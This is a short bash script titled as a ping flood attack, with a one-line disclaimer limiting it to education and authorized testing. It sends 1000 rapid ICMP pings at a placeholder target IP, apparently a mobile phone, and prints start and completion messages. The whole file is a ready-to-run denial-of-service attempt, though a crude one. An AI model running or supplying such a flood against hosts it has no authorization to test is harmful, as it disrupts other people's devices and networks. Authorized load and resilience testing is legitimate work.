#!/bin/bash

# Ping Flood Attack Script (Linux)
# ⚠️ For educational and authorized testing only

TARGET_IP="IP"  # Change to your mobile's IP
PACKET_COUNT=1000          # Number of packets to send

echo "[*] Starting ping flood attack on $TARGET_IP with $PACKET_COUNT packets..."

ping -c $PACKET_COUNT -i 0.01 $TARGET_IP > /dev/null

echo "[+] Ping flood attack completed."
